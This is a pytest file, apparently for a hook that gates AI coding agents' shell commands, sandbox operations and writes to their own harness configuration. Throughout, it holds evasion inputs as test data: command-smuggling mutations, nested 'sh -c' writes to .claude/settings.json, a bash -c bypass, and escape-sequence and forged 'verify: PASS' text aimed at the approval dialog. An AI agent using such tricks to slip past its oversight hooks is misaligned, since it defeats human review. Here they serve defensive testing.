        assert FAILED.format(word) in text
        assert str(plain) not in text

    def test_child_contract(self, run_hook, home, hook, monkeypatch, git_repo):
        fake = FakePreview(stdout=_create_data(setup="npm ci"))
        monkeypatch.setattr(subprocess, "Popen", fake)
        command = "csb create --image generic --setup 'npm ci'"
        run_env = {**_ours(home), **{k: "/evil" for k in gate.LAUNCH_ENV_DROP}}
        res = _run(run_hook, hook, command, cwd=git_repo, env=run_env)
        assert "--setup: /bin/sh -c 'npm ci'" in _text(res, hook)
        ((args, kwargs),) = fake.calls
        # the hook's own interpreter, isolated and without site, importing the
        # hook's own claude_sandbox.py, with the launch variables removed
        assert (
            args[:4]
            == [sys.executable, "-I", "-S", "-c"]
            == [TRUSTED, "-I", "-S", "-c"]
        )
        assert os.path.realpath(args[5]) == os.path.realpath(SANDBOX_CLI.parent)
        assert not set(gate.LAUNCH_ENV_DROP) & set(kwargs["env"])
        assert kwargs["env"]["PATH"] == run_env["PATH"]
        assert kwargs["start_new_session"] is True
        assert kwargs["stderr"] == subprocess.DEVNULL
        # the command reaches the child on stdin, never on its argv
        assert "npm ci" not in " ".join(args)
        request = json.loads(fake.inputs[0])
        assert request == {
            "argv": ["create", "--image", "generic", "--setup", "npm ci"],
            "cwd": str(git_repo),
            "state": gate.state_dir(),
        }
        assert 0 < fake.timeouts[0] <= 5

    @pytest.mark.parametrize(
        ("fake", "word"),
        [
            (FakePreview(returncode=1, stdout=b"half"), "エラー"),
            (FakePreview(returncode=2), "拒否"),
            (FakePreview(stdout=b"not json"), "エラー"),
            (FakePreview(stdout=b"[]"), "エラー"),
            (FakePreview(stdout=b"\xff\xfe"), "エラー"),
            (FakePreview(stdout={"schema": 1, "kind": "create"}), "エラー"),
            (FakePreview(error=OSError("no python")), "エラー"),
            (FakePreview(error=RuntimeError("boom")), "エラー"),
        ],
    )
    def test_a_failed_child_is_a_fixed_phrase(
        self, run_hook, home, hook, monkeypatch, git_repo, fake, word
    ):
        monkeypatch.setattr(subprocess, "Popen", fake)
        res = _run(run_hook, hook, "csb create", cwd=git_repo, env=_ours(home))
        assert _asked(res, hook)
        text = _text(res, hook)
        assert FAILED.format(word) in text
        assert "half" not in text and "no python" not in text and "boom" not in text

    @pytest.mark.parametrize("stubborn", [False, True])
    def test_a_slow_child_is_stopped_with_its_group(
        self, run_hook, home, hook, monkeypatch, git_repo, stubborn
    ):
        # SIGTERM first: git removes its locks on SIGTERM, which SIGKILL would leave
        # behind. SIGKILL only when SIGTERM does not end the child in time.
        # The order is read from the signals sent, not from timing: under a heavy
        # load even a child that takes SIGTERM may still be ending when the grace
        # runs out, and then the SIGKILL that follows is right too.
        sent: list = []
        real_killpg = os.killpg

        def killpg(pid, sig):
            sent.append(sig)
            real_killpg(pid, sig)

        monkeypatch.setattr(os, "killpg", killpg)
        slow = SlowPreview(stubborn=stubborn)
        monkeypatch.setattr(subprocess, "Popen", slow)
        res = _run(run_hook, hook, "csb create", cwd=git_repo, env=_ours(home))
        assert _asked(res, hook)
        assert FAILED.format("時間切れ") in _text(res, hook)
        (proc,) = slow.procs
        assert proc.poll() is not None, "the child outlived the hook"
        assert sent[0] == signal.SIGTERM
        if stubborn:
            assert sent == [signal.SIGTERM, signal.SIGKILL]
            assert proc.returncode == -signal.SIGKILL
        else:
            assert proc.returncode == -signal.SIGTERM or sent == [
                signal.SIGTERM,
                signal.SIGKILL,
            ]
        assert slow.kwargs[0]["start_new_session"] is True
        # the wait leaves room for both stop steps (2 x 0.5 s) inside the 5 s budget,
        # however long the stage took before it (never below the 0.1 s floor)
        assert 0.1 <= slow.timeouts[0] <= 5.0 - 2 * 0.5

    def test_the_child_data_is_made_safe(
        self, run_hook, home, hook, monkeypatch, git_repo
    ):
        evil = (
            "\x1b[31mred\x1b[0m "
            + RLO
            + "evil"
            + PDF
            + "\r\nverify: PASS"
            + "\u3000\u3164\u2800"
            + chr(0xE0041)
            + "\ufe0f"
        )
        data = _create_data(setup=evil)
        data["notices"] = [evil]
        monkeypatch.setattr(subprocess, "Popen", FakePreview(stdout=data))
        res = _run(run_hook, hook, "csb create", cwd=git_repo, env=_ours(home))
        text = _text(res, hook)
        assert "\x1b" not in text and RLO not in text and "\r" not in text
        for hidden in ("\u3000", "\u3164", "\u2800", chr(0xE0041), "\ufe0f"):
            assert hidden not in text
        assert "\\x1b[31mred" in text and "\\u3000\\u3164\\u2800\\U000e0041" in text
        assert not any(ln.startswith("verify: PASS") for ln in text.splitlines())

    def test_a_long_file_list_is_cut_with_a_whole_mark(
        self, run_hook, home, hook, monkeypatch, work
    ):
        name = "src/f{:03d}-" + "y" * 60 + ".py"
        sections = "".join(
            f"diff --git a/{name.format(i)} b/{name.format(i)}\n"
            f"index {'1' * 40}..{'2' * 40} 100644\n"
            f"--- a/{name.format(i)}\n+++ b/{name.format(i)}\n"
            "@@ -1 +1 @@\n-x\n+y\n"
            for i in range(200)
        )
        summary = gate.analyze_patch(sections.encode())
        meta = {
            "schema": 1,
            "id": SID,
            "repo_root": "/srv/project",
            "base_commit": "1" * 40,
            "base_tree": "2" * 40,
            "snap_commit": "3" * 40,
            "image": {
                "source": "generic",
                "ref": gate.GENERIC_IMAGE_REF,
                "id": "sha256:" + "b" * 64,
            },
            "setup_image_id": "sha256:" + "c" * 64,
            "work_container_id": "d" * 64,
            "uid": 1000,
            "gid": 1000,
            "docker_bin": "/usr/local/bin/docker",
            "docker_host": "unix:///var/run/docker.sock",
            "created_at": 1_700_000_000.0,
        }
        data = gate.apply_preview_data(
            summary, meta, None, [], notes=[], head="same", patch_file="/s/p.patch"
        )
        monkeypatch.setattr(subprocess, "Popen", FakePreview(stdout=data))
        command = f"csb apply {SID} --patch {SHA}"
        res = _run(run_hook, hook, command, cwd=work, env=_ours(home))
        body = _body(res, hook).rstrip("\n")
        assert len(body) <= gate.PREVIEW_TOTAL_CHARS
        last = body.splitlines()[-1]
        assert last.startswith("… ファイル欄の残り") and last.endswith("で見る")

    def test_a_child_that_breaks_mid_talk_is_stopped_too(
        self, run_hook, home, hook, monkeypatch, git_repo
    ):
        fake = FakePreview(communicate_errors=[RuntimeError("pipe broke")])
        monkeypatch.setattr(subprocess, "Popen", fake)
        res = _run(run_hook, hook, "csb create", cwd=git_repo, env=_ours(home))
        assert _asked(res, hook)
        text = _text(res, hook)
        assert FAILED.format("エラー") in text and "pipe broke" not in text
        assert fake.stops == ["term"]  # it ended on SIGTERM: no SIGKILL needed

    def test_stopping_never_signals_a_bad_pid_and_never_waits_forever(
        self, run_hook, hook, monkeypatch
    ):
        stop = _run(run_hook, hook, "ls -la").globals["_stop_preview"]
        signalled: list = []

        def killpg(pid, sig):
            signalled.append((pid, sig))
            raise ProcessLookupError  # already gone

        monkeypatch.setattr(os, "killpg", killpg)

        class Stuck:
            def __init__(self, pid):
                self.pid = pid
                self.stops: list = []

            def terminate(self):
                self.stops.append("term")

            def kill(self):
                self.stops.append("kill")

            def communicate(self, timeout=None):
                raise subprocess.TimeoutExpired("child", timeout)

        both = [signal.SIGTERM, signal.SIGKILL]
        for pid, expected in ((0, []), (1, []), (-5, []), (4242, both)):
            proc = Stuck(pid)
            stop(proc)  # returns although the child never answers
            assert signalled == [(pid, sig) for sig in expected]
            # a signal that cannot reach the group goes to the child itself
            assert proc.stops == ["term", "kill"]
            signalled.clear()

    def test_no_summary_for_net_on_or_a_bypass(
        self, run_hook, home, work, hook, monkeypatch
    ):
        fake = FakePreview(stdout=_create_data())
        monkeypatch.setattr(subprocess, "Popen", fake)
        for command in (
            f"csb net on {SID}",
            f"bash -c 'csb apply {SID} --patch {SHA}'",
        ):
            res = _run(run_hook, hook, command, cwd=work, env=_ours(home))
            assert _asked(res, hook)
            assert "要約" not in _text(res, hook)
        assert fake.calls == []


# ---------------------------------------------------------------------------
# The session cwd: one value for the harness check and the sandbox stage
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
class TestSessionCwd:
    """Both entry points pass one cwd to harness_write_ask_reason(cwd=…) and to the
    sandbox stage: the payload's `cwd` when it is an absolute path string, else the
    hook's own cwd, else None (the harness check then stays lexical)."""

    @pytest.mark.parametrize(
        "command",
        [
            "cd ~/.local/bin && cp x .",
            "cd ~/.claude/hooks && cp x claude_sandbox.py",
            "cd .claude/hooks && echo x > a.py",
        ],
    )
    def test_a_relative_write_into_the_harness_asks(
        self, run_hook, home, work, hook, command
    ):
        (work / ".claude" / "hooks").mkdir(parents=True)
        calls: list = []
        res = _run(
            run_hook,
            hook,
            command,
            cwd=work if "~" not in command else home,
            urlopen=fake_gemini("ALLOW", calls=calls),
            codex=fake_run(stdout="ALLOW"),
        )
        assert _asked(res, hook), _text(res, hook)
        assert "writes to the agent harness configuration" in _text(res, hook)
        assert calls == []
        assert _last_entry(res, hook)[:2] == ("ASK", "pre")

    @pytest.mark.parametrize(
        "command",
        [
            # residual gaps of the lexical check, closed now that the cwd is passed
            "x=.claude/settings.json; tee $x",
            'sh -c "sh -c \'sh -c \\"echo x > .claude/settings.json\\"\'"',
        ],
    )
    def test_gaps_closed_by_the_cwd_ask(self, run_hook, work, hook, command):
        (work / ".claude").mkdir()
        res = _run(
            run_hook,
            hook,
            command,
            cwd=work,
            urlopen=fake_gemini("ALLOW"),
            codex=fake_run(stdout="ALLOW"),
        )
        assert _asked(res, hook)
        assert _last_entry(res, hook)[:2] == ("ASK", "pre")

    @pytest.mark.parametrize("command", ["echo x > notes.txt", "cd src && cp a b"])
    def test_an_ordinary_relative_write_is_not_asked(
        self, run_hook, work, hook, command
    ):
        (work / "src").mkdir()
        res = _run(run_hook, hook, command, cwd=work, urlopen=fake_gemini("ALLOW"))
        assert _outcome(res, hook) == "allow", _text(res, hook)
        assert _last_entry(res, hook)[1] == "gemini"

    def test_no_cwd_means_no_create_summary(self, run_hook, hook):
        preview = _run(run_hook, hook, "ls -la").globals["sandbox_preview"]
        cmd = gate.parse_csb("csb create")
        assert preview(cmd, "csb create", None, 0.0) == (None, "作業ディレクトリ不明")
        assert preview(cmd, "csb create", "rel", 0.0) == (None, "作業ディレクトリ不明")

    def test_without_a_payload_cwd_the_hooks_own_cwd_is_used(
        self, run_hook, home, hook, monkeypatch
    ):
        bin_dir = home / ".local" / "bin"
        bin_dir.mkdir(parents=True)
        monkeypatch.chdir(bin_dir)
        res = _run(
            run_hook,
            hook,
            "cp x csb",
            urlopen=fake_gemini("ALLOW"),
            codex=fake_run(stdout="ALLOW"),
        )
        assert _asked(res, hook), _text(res, hook)
        assert "writes to the agent harness configuration" in _text(res, hook)
        assert res.globals["review_cwd"] == str(bin_dir)

    @pytest.mark.parametrize("bad", ["relative/dir", "", 5, None, ["/"], "/x\x00y"])
    def test_an_unusable_payload_cwd_falls_back_without_breaking(
        self, run_hook, hook, monkeypatch, work, bad
    ):
        monkeypatch.chdir(work)
        payload = hook_payload("ls -la")
        payload["cwd"] = bad
        res = run_hook(hook, payload)
        assert _outcome(res, hook) == "allow", _text(res, hook)
        assert "hook error" not in _text(res, hook)
        assert res.globals["review_cwd"] == str(work)
        payload = hook_payload("make build")
        payload["cwd"] = bad
        res = run_hook(hook, payload, urlopen=fake_gemini("ALLOW"))
        assert _outcome(res, hook) == "allow"
        assert _last_entry(res, hook)[1] == "gemini"

    def test_with_no_cwd_at_all_the_harness_check_is_told_so(
        self, run_hook, home, hook, monkeypatch
    ):
        def gone():
            raise FileNotFoundError("cwd was removed")

        monkeypatch.setattr(os, "getcwd", gone)
        res = _run(
            run_hook,
            hook,
            "cd .claude/hooks && echo x > a.py",
            urlopen=fake_gemini("ALLOW"),
            codex=fake_run(stdout="ALLOW"),
        )
        # not None (literal only, which lets this write through), but "unknown":
        # a relative write that cannot be placed goes to the human
        assert res.globals["review_cwd"] == HARNESS_CWD_UNKNOWN
        assert _asked(res, hook) and _last_entry(res, hook)[:2] == ("ASK", "pre")
        res = _run(run_hook, hook, "ls -la")
        assert _outcome(res, hook) == "allow"
        # nor can the sandbox CLI be verified without a cwd: no static allow
        res = _run(run_hook, hook, "csb ls", env=_ours(home))
        assert _asked(res, hook) and IDENTITY_DENY in _text(res, hook)

    def test_the_sandbox_stage_sees_the_same_cwd(
        self, run_hook, home, hook, monkeypatch, work
    ):
        # With no payload cwd, the hook's own cwd is the session cwd, and the
        # preview child is asked about that directory.
        fake = FakePreview(stdout=_create_data())
        monkeypatch.setattr(subprocess, "Popen", fake)
        monkeypatch.chdir(work)
        _run(run_hook, hook, "csb create --image generic", env=_ours(home))
        assert json.loads(fake.inputs[0])["cwd"] == str(work)


# ---------------------------------------------------------------------------
# An exception never becomes an allow
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
class TestFailClosed:
    def test_a_classifier_exception_asks(self, run_hook, home, hook, monkeypatch):
        def boom(command):
            raise RuntimeError("secret detail")

        monkeypatch.setattr(gate, "classify_sandbox_command", boom)
        res = _run(
            run_hook,
            hook,
            "csb ls",
            env=_ours(home),
            urlopen=fake_gemini("ALLOW"),
            codex=fake_run(stdout="ALLOW"),
        )
        assert _asked(res, hook)
        assert "csb の判定中にエラー" in _text(res, hook)
        assert "secret detail" not in _text(res, hook)
        assert _last_entry(res, hook)[:2] == ("ASK", "sandbox")

    def test_a_summary_exception_keeps_the_ask(
        self, run_hook, home, work, hook, monkeypatch
    ):
        def boom(home=None):
            raise RuntimeError("state failed")

        monkeypatch.setattr(gate, "state_dir", boom)
        command = f"csb apply {SID} --patch {SHA}"
        res = _run(run_hook, hook, command, cwd=work, env=_ours(home))
        assert _asked(res, hook)
        text = _text(res, hook)
        assert "csb apply は" in text and FAILED.format("エラー") in text
        assert "state failed" not in text


# ---------------------------------------------------------------------------
# Invariants: nothing the other layers flag, and no mutated canonical form, is
# statically allowed here
# ---------------------------------------------------------------------------
def _commands(cases):
    return [case[0] if isinstance(case, tuple) else case for case in cases]


POSITIVE_CORPORA = (
    _commands(gate_corpora.DOCKER_HIGH_RISK_CASES)
    + _commands(gate_corpora.GIT_HIGH_RISK_CASES)
    + _commands(gate_corpora.DENY_MIRROR_CASES)
    + gate_corpora.HARNESS_DOCKER_CASES
    + gate_corpora.HARNESS_SED_CASES
    + gate_corpora.HARNESS_STATE_PATH_CASES
    + harness_corpora.HARNESS_REDIRECT_CASES
    + harness_corpora.HARNESS_WRITER_CASES
    + harness_corpora.HARNESS_SHELL_CODE_CASES
    + harness_corpora.HARNESS_NONCANONICAL_SPELLING_CASES
    + harness_corpora.HARNESS_FOREIGN_CODE_CASES
    + harness_corpora.HARNESS_WRITE_RESIDUAL_CASES
)

# The corpora above never start with `csb`, so on their own they cannot catch a
# static allow that is too loose. These mutate the canonical forms themselves.
_MUTATIONS = (
    "FOO=1 {}",
    "{} ;",
    "{}; true",
    "{} | cat",
    "{} && ls",
    "{} &",
    "{} > out",
    "{} $(x)",
    "{} `x`",
    "{} *",
    "{} ~",
    "{} {{a,b}}",
    "command {}",
    "env {}",
    "./{}",
    "{} #",
    "{}\nls",
)
CANONICAL_BOUNDARIES = [c for c, _ in BOUNDARIES]


def test_the_corpora_are_not_empty():
    assert len(POSITIVE_CORPORA) > 400
    assert not any(c.startswith("csb") for c in POSITIVE_CORPORA)


@pytest.mark.parametrize("command", POSITIVE_CORPORA)
def test_no_flagged_command_is_statically_allowed(command):
    assert gate.classify_sandbox_command(command)[0] != "allow", command


@pytest.mark.parametrize("mutation", _MUTATIONS)
@pytest.mark.parametrize("canonical", CANONICAL_ALLOW + CANONICAL_BOUNDARIES)
def test_no_mutated_canonical_form_is_statically_allowed(canonical, mutation):
    command = mutation.format(canonical)
    decision, _ = gate.classify_sandbox_command(command)
    assert decision != "allow", command
    if canonical in CANONICAL_BOUNDARIES:
        assert decision == "ask", command


@pytest.mark.parametrize("command", BYPASSES)
def test_every_bypass_asks(command):
    assert gate.classify_sandbox_command(command)[0] == "ask", command


# ---------------------------------------------------------------------------
# Codex's shell tool runs the command in tool_input.workdir
# ---------------------------------------------------------------------------
def _with_workdir(command, cwd, workdir=..., *, drop_key=False):
    payload = hook_payload(command)
    payload["cwd"] = str(cwd)
    if not drop_key:
        payload["tool_input"]["workdir"] = workdir
    return payload


HARNESS_WRITE = "agent harness configuration"
UNRESOLVED_WRITE = "cannot be resolved"


class TestCodexWorkdir:
    """The command runs in workdir, so the harness check and the sandbox stage use
    it as the cwd: an absolute workdir as it is, a relative one joined to the
    session cwd, anything else (`~`, empty, NUL, another type) as
    HARNESS_CWD_UNKNOWN. With no workdir, the session cwd as before."""

    @pytest.fixture
    def harness_dir(self, tmp_path):
        path = tmp_path / "repo" / ".claude" / "hooks"
        path.mkdir(parents=True)
        return path

    def _run(self, run_hook, payload, env=None):
        return run_hook(CODEX_HOOK, payload, urlopen=fake_gemini("ALLOW"), env=env)

    def test_an_absolute_workdir_is_the_cwd(self, run_hook, work, harness_dir):
        res = self._run(
            run_hook, _with_workdir("cp a bash-review.py", work, str(harness_dir))
        )
        assert res.exit_code == 2 and HARNESS_WRITE in res.stderr
        assert _last_entry(res, CODEX_HOOK)[:2] == ("ASK", "pre")

    def test_a_relative_workdir_is_joined_to_the_session_cwd(
        self, run_hook, tmp_path, harness_dir
    ):
        res = self._run(
            run_hook,
            _with_workdir("cp a bash-review.py", tmp_path, "repo/.claude/hooks"),
        )
        assert res.exit_code == 2 and HARNESS_WRITE in res.stderr

    @pytest.mark.parametrize(
        "workdir",
        ["~/.claude/hooks", "~", "", "/a\x00b", 42, ["/srv"], {"d": "/srv"}, "/x/~y"],
        ids=[
            "tilde-path",
            "tilde",
            "empty",
            "nul",
            "int",
            "list",
            "dict",
            "tilde-inside",
        ],
    )
    def test_an_unusable_workdir_is_an_unknown_cwd(self, run_hook, work, workdir):
        # a relative write can no longer be placed: it goes to the human
        res = self._run(run_hook, _with_workdir("cp a b", work, workdir))
        assert res.exit_code == 2 and UNRESOLVED_WRITE in res.stderr
        assert _last_entry(res, CODEX_HOOK)[:2] == ("ASK", "pre")

    @pytest.mark.parametrize("drop_key", [True, False], ids=["absent", "null"])
    def test_no_workdir_keeps_the_session_cwd(self, run_hook, work, drop_key):
        # (null is what an unset optional field serialises to: not a value)
        payload = _with_workdir("cp a b", work, None, drop_key=drop_key)
        res = self._run(run_hook, payload)
        assert UNRESOLVED_WRITE not in res.stderr and HARNESS_WRITE not in res.stderr
        res = self._run(run_hook, _with_workdir("cp a bash-review.py", work, None))
        assert HARNESS_WRITE not in res.stderr

    def test_the_sandbox_stage_uses_the_workdir(
        self, run_hook, home, tmp_path, monkeypatch
    ):
        fake = FakePreview(stdout=_create_data())
        monkeypatch.setattr(subprocess, "Popen", fake)
        repo = tmp_path / "proj"
        repo.mkdir()
        payload = _with_workdir("csb create --image generic", tmp_path, "proj")
        self._run(run_hook, payload, env=_ours(home))
        assert json.loads(fake.inputs[0])["cwd"] == str(tmp_path / "proj")

    def test_an_unknown_workdir_leaves_csb_unverified(self, run_hook, home, work):
        res = self._run(run_hook, _with_workdir("csb ls", work, "~"), env=_ours(home))
        assert res.exit_code == 2 and IDENTITY_DENY in res.stderr
        res = self._run(
            run_hook, _with_workdir("csb ls", work, str(work)), env=_ours(home)
        )
        assert res.exit_code == 0

    def test_a_relative_workdir_with_no_session_cwd_is_unknown(
        self, run_hook, monkeypatch
    ):
        def gone():
            raise FileNotFoundError("cwd removed")

        payload = hook_payload("cp a b")
        payload["tool_input"]["workdir"] = "sub"
        monkeypatch.setattr(os, "getcwd", gone)
        res = self._run(run_hook, payload)
        assert res.exit_code == 2 and UNRESOLVED_WRITE in res.stderr

    def test_the_claude_entry_has_no_workdir(self, run_hook, work, harness_dir):
        payload = _with_workdir("cp a bash-review.py", work, str(harness_dir))
        res = run_hook(HOOK, payload, urlopen=fake_gemini("ALLOW"))
        assert HARNESS_WRITE not in (res.reason or "")


# ---------------------------------------------------------------------------
# No session cwd at all: the gate gets HARNESS_CWD_UNKNOWN, not None
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
class TestUnknownSessionCwd:
    """cwd=None means "literal only" to harness_write_ask_reason, which lets a write
    through a variable, a cd or a named directory pass unasked. With no usable
    payload cwd and a failing os.getcwd(), the entries pass HARNESS_CWD_UNKNOWN."""

    @pytest.fixture
    def no_cwd(self, monkeypatch):
        def gone():
            raise FileNotFoundError("cwd removed")

        monkeypatch.setattr(os, "getcwd", gone)

    @pytest.mark.parametrize("payload_cwd", [None, "relative/dir", 7, "/a\x00b"])
    @pytest.mark.parametrize(
        "command",
        [
            "cp a b",
            "echo x > out.txt",
            "cd sub && cp a b",
            'cd "$X" && cp a b',
            "cp a ~D/x",
            "cd .claude/hooks && echo x > a.py",
        ],
    )
    def test_a_relative_write_asks(self, run_hook, hook, no_cwd, payload_cwd, command):
        payload = hook_payload(command)
        if payload_cwd is not None:
            payload["cwd"] = payload_cwd
        res = run_hook(
            hook, payload, urlopen=fake_gemini("ALLOW"), run=fake_run(stdout="ALLOW")
        )
        assert _asked(res, hook)
        assert UNRESOLVED_WRITE in _text(res, hook)
        assert _last_entry(res, hook)[:2] == ("ASK", "pre")

    def test_a_read_only_command_is_unaffected(self, run_hook, hook, no_cwd):
        res = run_hook(hook, hook_payload("ls -la"), urlopen=fake_gemini("ALLOW"))
        assert _outcome(res, hook) == "allow"

    def test_csb_is_still_not_verified(self, run_hook, home, hook, no_cwd):
        res = run_hook(hook, hook_payload("csb ls"), env=_ours(home))
        assert _asked(res, hook) and IDENTITY_DENY in _text(res, hook)

    def test_a_known_cwd_keeps_resolving(self, run_hook, hook, work):
        # the twin: with the session cwd known, a plain relative write is placed
        # there and is not a harness write
        payload = hook_payload("cp a b")
        payload["cwd"] = str(work)
        res = run_hook(
            hook, payload, urlopen=fake_gemini("ALLOW"), run=fake_run(stdout="ALLOW")
        )
        assert UNRESOLVED_WRITE not in _text(res, hook)


# ---------------------------------------------------------------------------
# csb image build: a boundary with a summary (real child, both entries)
# ---------------------------------------------------------------------------
def _image_data(**kw):
    fields = {
        "context": "/repo/containers/sandbox",
        "dockerfile": "/repo/containers/sandbox/Dockerfile",
        "sha256": "c" * 64,
        "bases": [["debian:trixie-slim@sha256:" + "b" * 64, True]],
        "instructions": ["RUN apt-get update && make", "USER 1000:1000"],
        "context_diff": {"state": "changed", "count": 2},
        "docker": {"path": "/usr/local/bin/docker", "owner": "root", "signature": "-"},
        "blockers": [],
    }
    fields.update(kw)
    return gate.image_build_preview_data(**fields)


@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
def test_image_build_asks_with_what_the_build_runs(
    run_hook, home, work, hook, monkeypatch
):
    fake = FakePreview(stdout=_image_data())
    monkeypatch.setattr(subprocess, "Popen", fake)
    res = _run(
        run_hook,
        hook,
        "csb image build --generic",
        env=_ours(home),
        cwd=work,
        urlopen=fake_gemini("ALLOW"),
        codex=fake_run(stdout="ALLOW"),
    )
    assert _asked(res, hook)
    text = _text(res, hook)
    assert "csb image build は" in text and gate.IMAGE_BUILD_ADVISORY in text
    assert "HEAD との差: あり (未コミットの変更 2 ファイル)" in text
    assert (
        "ビルドで実行する命令 (2 件):" in text
        and "  RUN apt-get update && make" in text
    )
    assert "ネットワーク: ビルドの間ずっと接続する" in text
    assert json.loads(fake.inputs[0])["argv"] == ["image", "build", "--generic"]
    assert _last_entry(res, hook)[:2] == ("ASK", "sandbox")


@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
def test_the_real_generic_dockerfile_does_not_fit_the_dialog(
    run_hook, home, work, hook
):
    # The repository's containers/sandbox/Dockerfile, read by the real child: its
    # executed instructions (two long RUNs and an ENV) put the decision part past
    # PREVIEW_DECISION_CHARS, so the dialog cannot approve the build (Claude: deny,
    # Codex: exit 2) and a human runs `csb image build --generic` instead.
    res = _run(
        run_hook,
        hook,
        "csb image build --generic",
        env=_ours(home),
        cwd=work,
        urlopen=fake_gemini("ALLOW"),
        codex=fake_run(stdout="ALLOW"),
    )
    assert _denied(res, hook)
    assert gate.IMAGE_BUILD_OVERFLOW in _text(res, hook)


# ---------------------------------------------------------------------------
# The two entry points keep their sandbox code in step
# ---------------------------------------------------------------------------
# The sandbox definitions and the sandbox stage are copied, not shared through a
# module (each entry keeps its own copy of the hook code). They sit between
# `# >>> shared: NAME` and `# <<< shared: NAME` markers, and what is between the
# markers must be the same bytes in both. The stage alone may differ in these
# lines, where each side reports a decision its own way (Claude: a JSON decision;
# Codex: stderr and exit 2, with `decided_exit` for the allow path).
SHARED_REGIONS = ("sandbox-setup", "sandbox-helpers", "sandbox-stage")
ALLOWED_STAGE_DIFFERENCES = {
    (
        "        emit_decision(sandbox_verdict, sandbox_text)",
        "        emit_block(sandbox_text)",
    ),
    ("        sys.exit(0)", "        sys.exit(2)"),
    ('        emit_decision("allow", sandbox_text)', "        decided_exit = 0"),
}


def _shared_region(path: Path, name: str) -> list[str]:
    lines = path.read_text(encoding="utf-8").splitlines()
    begins = [
        i
        for i, line in enumerate(lines)
        if line.lstrip().startswith(f"# >>> shared: {name} ")
    ]
    ends = [
        i for i, line in enumerate(lines) if line.strip() == f"# <<< shared: {name}"
    ]
    assert len(begins) == 1 and len(ends) == 1, f"{path.name}: markers for {name}"
    assert begins[0] < ends[0]
    return lines[begins[0] : ends[0] + 1]


@pytest.mark.parametrize("name", SHARED_REGIONS)
def test_the_entries_share_their_sandbox_code(name):
    claude = _shared_region(REPO_ROOT / HOOK, name)
    codex = _shared_region(REPO_ROOT / CODEX_HOOK, name)
    assert len(claude) == len(codex), name
    allowed = ALLOWED_STAGE_DIFFERENCES if name == "sandbox-stage" else set()
    differences = {(a, b) for a, b in zip(claude, codex) if a != b}
    assert differences <= allowed, sorted(differences - allowed)
    if name == "sandbox-stage":
        # each allowed difference is used exactly once (none hides a second copy)
        pairs = [(a, b) for a, b in zip(claude, codex) if a != b]
        assert sorted(pairs) == sorted(allowed)


def test_the_shared_regions_hold_the_sandbox_code():
    text = "\n".join(_shared_region(REPO_ROOT / HOOK, "sandbox-helpers"))
    for name in ("csb_is_ours", "_stop_preview", "sandbox_preview", "_cap"):
        assert f"\ndef {name}(" in text
    assert "\ndef sandbox_boundary_text(" in text
    setup = "\n".join(_shared_region(REPO_ROOT / HOOK, "sandbox-setup"))
    for constant in ("SANDBOX_BOUNDARIES", "SANDBOX_IDENTITY_DENY", "_PREVIEW_DRIVER"):
        assert f"\n{constant} = " in setup
    stage = "\n".join(_shared_region(REPO_ROOT / HOOK, "sandbox-stage"))
    assert "classify_sandbox_command(command)" in stage and "csb_is_ours(" in stage
